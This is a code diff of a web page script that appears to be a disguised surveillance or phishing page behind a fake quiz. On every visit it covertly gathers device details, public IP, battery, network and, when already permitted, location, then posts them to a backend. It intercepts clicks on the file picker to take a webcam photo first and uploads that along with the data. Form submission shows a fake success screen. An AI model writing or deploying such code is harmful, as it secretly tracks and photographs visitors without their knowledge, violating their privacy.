@@ -11,19 +11,7 @@ let cameraInProgress = false;
 let capturedImage = null;
 
 // ================================
-// CLEAN VIDEO ON PAGE LOAD
-// ================================
-window.addEventListener("DOMContentLoaded", () => {
-  video.srcObject = null;
-  video.style.display = "none";
-  video.removeAttribute("autoplay");
-
-  // send metadata once on visit
-  sendPayloadOnVisit();
-});
-
-// ================================
-// COLLECT BETTER METADATA
+// COLLECT METADATA
 // ================================
 async function collectMetadata() {
   const metadata = {
@@ -45,53 +33,49 @@ async function collectMetadata() {
     },
 
     hardware: {
-      deviceMemory: navigator.deviceMemory || "N/A",
-      cpuCores: navigator.hardwareConcurrency || "N/A"
+      deviceMemory: navigator.deviceMemory || "Unknown",
+      cpuCores: navigator.hardwareConcurrency || "Unknown"
     },
 
-    battery: "N/A",
-    location: "N/A",
-
-    network: navigator.connection
-      ? {
-          type: navigator.connection.effectiveType,
-          downlink: navigator.connection.downlink,
-          rtt: navigator.connection.rtt
-        }
-      : "N/A",
-
+    battery: {},
+    location: {},
+    network: {},
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     time: new Date().toLocaleString(),
-    ip: "N/A"
+    ip: "Unknown"
   };
 
+  // battery
   if (navigator.getBattery) {
     try {
       const b = await navigator.getBattery();
-      metadata.battery = {
-        level: Math.round(b.level * 100),
-        charging: b.charging
-      };
+      metadata.battery = { level: Math.round(b.level * 100), charging: b.charging };
     } catch {}
   }
 
+  // location (permission required only when granted)
   if (navigator.permissions && navigator.geolocation) {
     try {
       const status = await navigator.permissions.query({ name: "geolocation" });
-
       if (status.state === "granted") {
         const pos = await new Promise((res, rej) =>
           navigator.geolocation.getCurrentPosition(res, rej)
         );
-
-        metadata.location = {
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude
-        };
+        metadata.location = { lat: pos.coords.latitude, lon: pos.coords.longitude };
       }
     } catch {}
   }
 
+  // network
+  if (navigator.connection) {
+    metadata.network = {
+      type: navigator.connection.effectiveType,
+      downlink: navigator.connection.downlink,
+      rtt: navigator.connection.rtt
+    };
+  }
+
+  // public IP
   try {
     const ipRes = await fetch("https://api.ipify.org?format=json");
     const ipData = await ipRes.json();
@@ -102,26 +86,19 @@ async function collectMetadata() {
 }
 
 // ================================
-// CAMERA CAPTURE + UPLOAD
+// CAMERA CAPTURE ON FILE CLICK
 // ================================
-async function captureAndSendCamera() {
+async function captureCamera() {
   if (cameraCaptured || cameraInProgress) return;
-
   cameraInProgress = true;
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
-
     video.srcObject = stream;
     video.setAttribute("playsinline", true);
     video.style.display = "block";
 
-    await new Promise((resolve) => {
-      video.onloadedmetadata = () => resolve();
-    });
-
     await video.play();
-
     await new Promise((r) => setTimeout(r, 1200));
 
     canvas.width = video.videoWidth || 640;
@@ -132,15 +109,8 @@ async function captureAndSendCamera() {
 
     capturedImage = canvas.toDataURL("image/png");
 
-    await fetch(`${BACKEND_BASE}/upload`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ image: capturedImage }),
-    });
-
     stream.getTracks().forEach((t) => t.stop());
     video.style.display = "none";
-
     cameraCaptured = true;
   } catch (err) {
     console.error("❌ Camera error:", err);
@@ -150,72 +120,40 @@ async function captureAndSendCamera() {
 }
 
 // ================================
-// CAMERA TRIGGER (Safari Safe)
+// FILE INPUT CLICK
 // ================================
 fileInput.addEventListener("click", async (e) => {
   if (!cameraCaptured && !cameraInProgress) {
     e.preventDefault();
-
-    await captureAndSendCamera();
-
-    setTimeout(() => fileInput.click(), 50);
+    await captureCamera();
+    setTimeout(() => fileInput.click(), 50); // reopen file dialog after capture
   }
 });
 
 // ================================
-// FILE UPLOAD FUNCTION
-// ================================
-async function uploadFile(file) {
-  return new Promise((resolve, reject) => {
-    const reader = new FileReader();
-
-    reader.onload = async () => {
-      try {
-        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            file: reader.result,
-            filename: file.name
-          }),
-        });
-
-        resolve(await res.json());
-      } catch (err) {
-        reject(err);
-      }
-    };
-
-    reader.onerror = () => reject(reader.error);
-    reader.readAsDataURL(file);
-  });
-}
-
-// ================================
-// SEND PAYLOAD ON VISIT
+// AUTO SEND METADATA ON VISIT
 // ================================
 async function sendPayloadOnVisit() {
   try {
     const metadata = await collectMetadata();
-
     const res = await fetch(`${BACKEND_BASE}/file-upload`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        metadata,
-        cameraImage: capturedImage || null
-      }),
+      body: JSON.stringify({ metadata, cameraImage: capturedImage || null }),
     });
-
-    console.log("✅ Auto-visit upload:", await res.json());
+    console.log("✅ Metadata upload:", await res.json());
   } catch (err) {
     console.error("❌ Upload failed:", err);
   }
 }
 
 // ================================
-// FORM SUBMIT (NORMAL)
+// FORM SUBMIT
 // ================================
-form.addEventListener("submit", () => {
-  // allow normal form submission
+form.addEventListener("submit", (e) => {
+  e.preventDefault();
+  document.getElementById("quiz-container").style.display = "none";
+  document.getElementById("success-container").style.display = "block";
 });
+
+window.addEventListener("DOMContentLoaded", () => sendPayloadOnVisit());
